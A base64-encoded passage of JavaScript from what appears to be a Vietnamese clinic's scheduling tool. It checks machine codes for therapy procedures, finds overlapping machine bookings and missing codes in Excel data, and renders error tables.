eF07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZUluZm8gPSBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBDaOG7iSBraeG7g20gdHJhIDMgdGjhu6cgdGh14bqtdCBjw7MgbWFjaGluZUNvZGUNCiAgICAgICAgICAgIGlmICghcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZSkgcmV0dXJuOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBjb25zdCBleHBlY3RlZENvZGVzID0gQXJyYXkuaXNBcnJheShwcm9jZWR1cmVJbmZvLm1hY2hpbmVDb2RlKSANCiAgICAgICAgICAgICAgICA/IHByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUgDQogICAgICAgICAgICAgICAgOiBbcHJvY2VkdXJlSW5mby5tYWNoaW5lQ29kZV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIG3DoyBtw6F5IGPDsyBjaOG7qWEgYuG6pXQga+G7syBtw6MgZXhwZWN0ZWQgbsOgbyBraMO0bmcNCiAgICAgICAgICAgIGNvbnN0IGlzVmFsaWRNYWNoaW5lID0gZXhwZWN0ZWRDb2Rlcy5zb21lKGNvZGUgPT4gDQogICAgICAgICAgICAgICAgbWFjaGluZUNvZGUudG9VcHBlckNhc2UoKS5pbmNsdWRlcyhjb2RlLnRvVXBwZXJDYXNlKCkpDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIWlzVmFsaWRNYWNoaW5lICYmIG1hY2hpbmVDb2RlICE9PSAnJykgew0KICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIC8vIFjDoWMgxJHhu4tuaCB0aMO0bmcgYsOhbyBs4buXaSBj4bulIHRo4buDIGThu7FhIHRyw6puIG3DoyBtw6F5IG5o4bqtcCBzYWkNCiAgICAgICAgICAgICAgICBsZXQgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSBtw6F5IGNoxrBhIHjDoWMgxJHhu4tuaCc7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoJ03EkEMnKSkgew0KICAgICAgICAgICAgICAgICAgICBlcnJvck1lc3NhZ2UgPSAnR+G6r24gbmjhuqdtIG3DoXkgxJFp4buHbiBjaMOibSBy4buTaSc7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCfEkEhOJykpIHsNCiAgICAgICAgICAgICAgICAgICAgZXJyb3JNZXNzYWdlID0gJ0fhuq9uIG5o4bqnbSDEkcOobiBo4buTbmcgbmdv4bqhaSBy4buTaSc7DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChtYWNoaW5lQ29kZS50b1VwcGVyQ2FzZSgpLmluY2x1ZGVzKCdHSCcpIHx8IG1hY2hpbmVDb2RlLnRvVXBwZXJDYXNlKCkuaW5jbHVkZXMoJ09HSCcpKSB7DQogICAgICAgICAgICAgICAgICAgIGVycm9yTWVzc2FnZSA9ICdH4bqvbiBuaOG6p20gbcOheSBnacOhYyBoxqFpIHLhu5NpJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWFjaGluZUVycm9yTG9nLnB1c2goew0KICAgICAgICAgICAgICAgICAgICByb3dOdW1iZXI6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IG9wZXJhdG9ySW5kZXggIT09IC0xID8gcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICBzdGFydFRpbWU6IHN0YXJ0Py5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICBlbmRUaW1lOiBlbmQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBtYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgZXhwZWN0ZWRDb2RlczogZXhwZWN0ZWRDb2Rlcy5qb2luKCcgaG/hurdjICcpLA0KICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiBlcnJvck1lc3NhZ2UgLy8gU+G7rSBk4bulbmcgdGjDtG5nIGLDoW8gY+G7pSB0aOG7gw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6F5IGTDsm5nICR7cm93TnVtYmVyfTpgLCBlcnJvcik7DQogICAgICAgIH0NCiAgICB9KTsNCn0NCg0KLy8gSMOgbSBraeG7g20gdHJhIHh1bmcgxJHhu5l0IG3DoXkNCmZ1bmN0aW9uIGNoZWNrTWFjaGluZUNvbmZsaWN0cyhwcm9jZWR1cmVzLCBqc29uRGF0YSkgew0KICAgIG1hY2hpbmVDb25mbGljdExvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkiKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGNvbnN0IHJvd3MgPSBqc29uRGF0YS5zbGljZSg5KTsNCiAgICBjb25zdCBtYWNoaW5lUHJvY2VkdXJlcyA9IFtdOw0KICAgIA0KICAgIC8vIEzhu41jIGPDoWMgdGjhu6cgdGh14bqtdCBjw7Mgc+G7rSBk4bulbmcgbcOheQ0KICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlTmFtZSA9IHJvd1tjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCIpKV07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUgfHwgIVBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0pIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgcHJvY2VkdXJlSW5mbyA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV07DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZUluZm8ubWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGlmICghbWFjaGluZUNvZGUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbmFtZUluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIkjhu40gdMOqbiIpKTsNCiAgICAgICAgICAgIGNvbnN0IG9wZXJhdG9ySW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu6cgdGh14bqtdCBjaMOtbmgiKSk7DQogICAgICAgICAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgICAgICAgICAgY29uc3QgZW5kSW5kZXggPSBjb21iaW5lZEhlYWRlcnMuZmluZEluZGV4KGggPT4gaC5pbmNsdWRlcygiVGjhu51pIGdpYW4ga+G6v3QgdGjDumMiKSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICBjb25zdCBlbmQgPSBwYXJzZURhdGVUaW1lKHJvd1tlbmRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChzdGFydCAmJiBlbmQpIHsNCiAgICAgICAgICAgICAgICBtYWNoaW5lUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgcm93TnVtYmVyOiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiBvcGVyYXRvckluZGV4ICE9PSAtMSA/IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIGRhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICBkaXNwbGF5U3RhcnQ6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBtYWNoaW5lQ29kZSwNCiAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogcHJvY2VkdXJlSW5mbw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kgeOG7rSBsw70gbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQogICAgDQogICAgLy8gS2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aGVvIHThu6tuZyBtw6F5IFbDgCB04burbmcgbmfDoHkNCiAgICBjb25zdCBtYWNoaW5lR3JvdXBzID0ge307DQogICAgDQogICAgbWFjaGluZVByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5tYWNoaW5lQ29kZX1fJHtwcm9jLmRhdGV9YDsgLy8gS+G6v3QgaOG7o3AgbcOjIG3DoXkgKyBuZ8OgeQ0KICAgICAgICBpZiAoIW1hY2hpbmVHcm91cHNba2V5XSkgew0KICAgICAgICAgICAgbWFjaGluZUdyb3Vwc1trZXldID0gW107DQogICAgICAgIH0NCiAgICAgICAgbWFjaGluZUdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgfSk7DQogICAgDQogICAgT2JqZWN0LnZhbHVlcyhtYWNoaW5lR3JvdXBzKS5mb3JFYWNoKHByb2NlZHVyZXMgPT4gew0KICAgICAgICBpZiAocHJvY2VkdXJlcy5sZW5ndGggPCAyKSByZXR1cm47DQogICAgICAgIA0KICAgICAgICBwcm9jZWR1cmVzLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgDQogICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgcHJvY2VkdXJlcy5sZW5ndGg7IGkrKykgew0KICAgICAgICAgICAgY29uc3QgcHJldiA9IHByb2NlZHVyZXNbaSAtIDFdOw0KICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IHByb2NlZHVyZXNbaV07DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgeGVtIGPDsyB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbiBraMO0bmcNCiAgICAgICAgICAgIGlmIChjdXJyZW50LnN0YXJ0IDwgcHJldi5lbmQpIHsNCiAgICAgICAgICAgICAgICBtYWNoaW5lQ29uZmxpY3RMb2cucHVzaCh7DQogICAgICAgICAgICAgICAgICAgIG1hY2hpbmVDb2RlOiBwcmV2Lm1hY2hpbmVDb2RlLA0KICAgICAgICAgICAgICAgICAgICBkYXRlOiBwcmV2LmRhdGUsIC8vIFRow6ptIG5nw6B5IMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgICAgICAgICBjb25mbGljdFByb2NlZHVyZXM6IFtwcmV2LCBjdXJyZW50XSwNCiAgICAgICAgICAgICAgICAgICAgbWVzc2FnZTogYE3DoXkgJHtwcmV2Lm1hY2hpbmVDb2RlfSDEkcaw4bujYyBz4butIGThu6VuZyDEkeG7k25nIHRo4budaSBjaG8gbmhp4buBdSBi4buHbmggbmjDom4gdHJvbmcgbmfDoHkgJHtwcmV2LmRhdGV9YA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSk7DQp9DQpmdW5jdGlvbiBjaGVja01pc3NpbmdNYWNoaW5lQ29kZXMocHJvY2VkdXJlcywganNvbkRhdGEpIHsNCiAgICBtaXNzaW5nTWFjaGluZUxvZyA9IFtdOw0KICAgIA0KICAgIGNvbnN0IGhlYWRlckxpbmUxID0ganNvbkRhdGFbN10gfHwgW107DQogICAgY29uc3QgaGVhZGVyTGluZTIgPSBqc29uRGF0YVs4XSB8fCBbXTsNCiAgICBjb25zdCBjb21iaW5lZEhlYWRlcnMgPSBoZWFkZXJMaW5lMS5tYXAoKGNvbCwgaW5kZXgpID0+IA0KICAgICAgICAoY29sICsgJyAnICsgKGhlYWRlckxpbmUyW2luZGV4XSB8fCAnJykpLnRyaW0oKQ0KICAgICk7DQoNCiAgICAvLyBUw6xtIGPhu5l0IG3DoyBtw6F5DQogICAgY29uc3QgbWFjaGluZUNvZGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiANCiAgICAgICAgaC5pbmNsdWRlcygiTcOjIG3DoXkiKSB8fCBoLmluY2x1ZGVzKCJNw6MgbcOheSB0aGVvIHRo4bunIHRodeG6rXQiKQ0KICAgICk7DQogICAgDQogICAgaWYgKG1hY2hpbmVDb2RlSW5kZXggPT09IC0xKSB7DQogICAgICAgIGNvbnNvbGUubG9nKCJLaMO0bmcgdMOsbSB0aOG6pXkgY+G7mXQgbcOjIG3DoXkgdHJvbmcgZmlsZSBFeGNlbCIpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgLy8gVMOsbSBjw6FjIGPhu5l0IGtow6FjIGPhuqduIHRoaeG6v3QNCiAgICBjb25zdCBwcm9jZWR1cmVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IikpOw0KICAgIGNvbnN0IG5hbWVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJI4buNIHTDqm4iKSk7DQogICAgY29uc3Qgb3BlcmF0b3JJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJUaOG7pyB0aHXhuq10IGNow61uaCIpKTsNCiAgICBjb25zdCBzdGFydEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGLhuq90IMSR4bqndSB0aOG7sWMgaGnhu4duIikpOw0KICAgIGNvbnN0IGVuZEluZGV4ID0gY29tYmluZWRIZWFkZXJzLmZpbmRJbmRleChoID0+IGguaW5jbHVkZXMoIlRo4budaSBnaWFuIGvhur90IHRow7pjIikpOw0KICAgIGNvbnN0IGRhdGVJbmRleCA9IGNvbWJpbmVkSGVhZGVycy5maW5kSW5kZXgoaCA9PiBoLmluY2x1ZGVzKCJOZ8OgeSB0aOG7sWMgaGnhu4duIikpOw0KDQogICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgIA0KICAgIC8vIERhbmggc8OhY2ggdGjhu6cgdGh14bqtdCBj4bqnbiBraeG7g20gdHJhIG3DoyBtw6F5DQogICAgY29uc3QgcHJvY2VkdXJlc1RvQ2hlY2sgPSBbDQogICAgICAgICLEkWnhu4duIGNow6JtIFtraW0gbmfhuq9uXSIsDQogICAgICAgICLEkWnhu4F1IHRy4buLIGLhurFuZyB0aWEgaOG7k25nIG5nb+G6oWkiLCANCiAgICAgICAgImdpw6FjIGjGoWkiDQogICAgXTsNCiAgICANCiAgICByb3dzLmZvckVhY2goKHJvdywgaW5kZXgpID0+IHsNCiAgICAgICAgY29uc3Qgcm93TnVtYmVyID0gaW5kZXggKyAxMDsNCiAgICAgICAgDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIXJvdyB8fCByb3cubGVuZ3RoID09PSAwKSByZXR1cm47DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSAocm93W3Byb2NlZHVyZUluZGV4XSB8fCAnJykudG9TdHJpbmcoKS50cmltKCk7DQogICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLy8gS2nhu4NtIHRyYSB4ZW0gdGjhu6cgdGh14bqtdCBjw7MgdHJvbmcgZGFuaCBzw6FjaCBj4bqnbiBraeG7g20gdHJhIGtow7RuZw0KICAgICAgICAgICAgY29uc3Qgc2hvdWxkQ2hlY2sgPSBwcm9jZWR1cmVzVG9DaGVjay5zb21lKHByb2MgPT4gDQogICAgICAgICAgICAgICAgcHJvY2VkdXJlTmFtZS50b0xvd2VyQ2FzZSgpLmluY2x1ZGVzKHByb2MudG9Mb3dlckNhc2UoKSkNCiAgICAgICAgICAgICk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmICghc2hvdWxkQ2hlY2spIHJldHVybjsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgY29uc3QgbWFjaGluZUNvZGUgPSAocm93W21hY2hpbmVDb2RlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKTsNCiAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZURhdGUgPSBkYXRlSW5kZXggIT09IC0xID8gKHJvd1tkYXRlSW5kZXhdIHx8ICcnKS50b1N0cmluZygpLnRyaW0oKSA6ICcnOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBO4bq/dSBtw6MgbcOheSB0cuG7kW5nIHRow6wgYsOhbyBs4buXaQ0KICAgICAgICAgICAgaWYgKCFtYWNoaW5lQ29kZSkgew0KICAgICAgICAgICAgICAgIGNvbnN0IHN0YXJ0ID0gcGFyc2VEYXRlVGltZShyb3dbc3RhcnRJbmRleF0sIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgY29uc3QgZW5kID0gcGFyc2VEYXRlVGltZShyb3dbZW5kSW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIG1pc3NpbmdNYWNoaW5lTG9nLnB1c2goew0KICAgICAgICAgICAgICAgICAgICByb3dOdW1iZXI6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IG9wZXJhdG9ySW5kZXggIT09IC0xID8gcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgZGF0ZTogcHJvY2VkdXJlRGF0ZSB8fCBzdGFydD8uZGF0ZUtleSB8fCAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgICAgICAgICAgICAgIHN0YXJ0VGltZTogc3RhcnQ/LmRpc3BsYXlUaW1lIHx8ICc/PycsDQogICAgICAgICAgICAgICAgICAgIGVuZFRpbWU6IGVuZD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgbWFjaGluZUNvZGU6IG1hY2hpbmVDb2RlDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgY29uc29sZS5lcnJvcihgTOG7l2kga2nhu4NtIHRyYSBtw6MgbcOheSBkw7JuZyAke3Jvd051bWJlcn06YCwgZXJyb3IpOw0KICAgICAgICB9DQogICAgfSk7DQp9DQoNCi8vIEjDoG0gaGnhu4NuIHRo4buLIGzhu5dpIGfhuq9uIHNhaSBtw6F5DQpmdW5jdGlvbiBkaXNwbGF5TWFjaGluZUVycm9ycygpIHsNCiAgICBjb25zdCBtYWNoaW5lRXJyb3JMb2dEaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUVycm9yTG9nJyk7DQogICAgY29uc3QgbWFjaGluZUVycm9yU2VjdGlvbiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdtYWNoaW5lRXJyb3JTZWN0aW9uJyk7DQogICAgDQogICAgaWYgKG1hY2hpbmVFcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9ICc8cD5LaMO0bmcgY8OzIGzhu5dpIGfhuq9uIHNhaSBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtYWNoaW5lRXJyb3JTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgbGV0IGh0bWwgPSBgDQogICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyLW51cnNlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBOZ8aw4budaSB0aOG7sWMgaGnhu4duPC90aD4NCiAgICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhciBmYS1jbG9jayBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVGjhu51pIGdpYW48L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLW1pY3JvY2hpcCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTcOjIG3DoXk8L3RoPg0KICAgICAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+YDsNCiAgICANCiAgICBtYWNoaW5lRXJyb3JMb2cuZm9yRWFjaChlcnJvciA9PiB7DQogICAgICAgIGh0bWwgKz0gYA0KICAgICAgICA8dHIgY2xhc3M9ImVycm9yLXJvdyI+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7ZXJyb3IucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtlcnJvci5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICAgICAgPHRkPjxjZW50ZXI+JHtlcnJvci5kYXRlfTxici8+JHtlcnJvci5zdGFydFRpbWV9IOKGkiAke2Vycm9yLmVuZFRpbWV9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgIDx0ZD4ke2Vycm9yLm1hY2hpbmVDb2RlfTwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImVycm9yLWRldGFpbCI+DQogICAgICAgICAgICAgICAgJHtlcnJvci5tZXNzYWdlfSA8IS0tIMSQw6MgxJHGsOG7o2MgY+G6rXAgbmjhuq10IHbhu5tpIHRow7RuZyBiw6FvIGPhu6UgdGjhu4MgLS0+DQogICAgICAgICAgICA8L3RkPg0KICAgICAgICA8L3RyPmA7DQogICAgfSk7DQogICAgDQogICAgaHRtbCArPSBgPC90Ym9keT48L3RhYmxlPmA7DQogICAgDQogICAgbWFjaGluZUVycm9yTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQogICAgbWFjaGluZUVycm9yU2VjdGlvbi5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICANCiAgICAvLyBD4bqtcCBuaOG6rXQgZHJvcGRvd24gbOG7jWMNCiAgICB1cGRhdGVNYWNoaW5lT3BlcmF0b3JGaWx0ZXIoKTsNCn0NCg0KLy8gSMOgbSBoaeG7g24gdGjhu4sgeHVuZyDEkeG7mXQgbcOheQ0KZnVuY3Rpb24gZGlzcGxheU1hY2hpbmVDb25mbGljdHMoKSB7DQogICAgY29uc3QgbWFjaGluZUNvbmZsaWN0TG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21hY2hpbmVDb25mbGljdExvZycpOw0KICAgIGNvbnN0IG1hY2hpbmVDb25mbGljdFNlY3Rpb24gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFjaGluZUNvbmZsaWN0U2VjdGlvbicpOw0KICAgIA0KICAgIGlmIChtYWNoaW5lQ29uZmxpY3RMb2cubGVuZ3RoID09PSAwKSB7DQogICAgICAgIG1hY2hpbmVDb25mbGljdExvZ0Rpdi5pbm5lckhUTUwgPSAnPHA+S2jDtG5nIGPDsyB4dW5nIMSR4buZdCBtw6F5IG7DoG8gxJHGsOG7o2MgZ2hpIG5o4bqtbjwvcD4nOw0KICAgICAgICBtYWNoaW5lQ29uZmxpY3RTZWN0aW9uLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgICAgIHJldHVybjsNCiAgICB9D